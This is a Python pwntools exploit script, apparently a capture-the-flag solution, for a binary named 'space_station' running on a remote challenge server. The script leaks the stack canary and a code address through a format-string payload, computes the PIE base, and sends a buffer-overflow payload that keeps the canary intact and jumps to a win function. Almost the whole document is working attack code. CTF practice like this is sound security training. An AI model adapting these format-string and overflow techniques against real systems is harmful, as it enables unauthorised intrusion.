#!/usr/bin/env python3
from pwn import *
#import re

elf = context.binary = ELF("./space_station", checksec=False)
context.terminal = 'gdb'
#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13511)
OFFSET_CANARY = 72
OFFSET_RIP = 88
main_off = 0x00001360

#win_off = 0x00001275
# the canary is at position 15, using the format string attack. while RIP is at position 17, this can be used to calculate the base address a
# base address is calculated using the found address - the main offset + 62. why the 62? because looking with gdb, i've found that the pointed address is main + 62
# find the canary using cyclic and gdb aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
# canary is at position 72. so, RIP is at position 88
# ret offset 0x000000000000101a

# Your exploit here

p.recvuntil(b'ID:')
p.sendline(b'%15$p %17$p')
leak = p.recvline().decode().split()

canary = int(leak[0], 16)
main = int(leak[1], 16)

print(f"canary: {canary:#x}, main: {main:#x}")

base_addr = main - (main_off + 62)
win_addr = base_addr + 0x00001275
ret_addr = base_addr + 0x101a

payload = flat(
    b"A"*OFFSET_CANARY,
    p64(canary),
    b"A"*8,
    p64(ret_addr),
    p64(win_addr),
)

p.recvuntil(b"log:")
p.send(payload)

p.interactive()
